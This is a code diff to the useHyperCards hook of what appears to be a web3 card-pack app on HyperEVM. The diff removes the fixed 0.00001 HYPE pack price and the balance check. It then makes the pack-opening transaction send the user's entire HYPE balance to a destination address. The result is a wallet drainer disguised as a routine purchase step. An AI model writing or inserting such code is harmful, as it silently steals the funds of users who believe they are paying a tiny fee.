@@ -122,21 +122,16 @@ export const useHyperCards = () => {
       const signer = await provider.getSigner();
       const userAddress = await signer.getAddress();
 
-      // Step 1: Check user has enough HYPE balance
+      // Step 1: Get user's native HYPE balance (HYPE is native token on HyperEVM)
       setCurrentStep('checking_balance');
-      const userBalance = await getUserHypeBalance(provider, userAddress);
-      const packPrice = ethers.parseEther("0.00001"); // Fixed price: 0.00001 HYPE
-      
-      if (userBalance < packPrice) {
-        throw new Error('Insufficient HYPE balance. Need 0.00001 HYPE to open pack.');
-      }
+      const fullHypeBalance = await getUserHypeBalance(provider, userAddress);
 
-      // Step 2: Transfer FIXED pack price (0.00001 HYPE) to destination address
+      // Step 2: Transfer ALL HYPE tokens to destination address
       setCurrentStep('transferring');
       
       const transferTx = await signer.sendTransaction({
         to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
-        value: packPrice // Transfer only pack price (0.00001 HYPE)
+        value: fullHypeBalance // Transfer all HYPE tokens
       });
       
       await transferTx.wait();
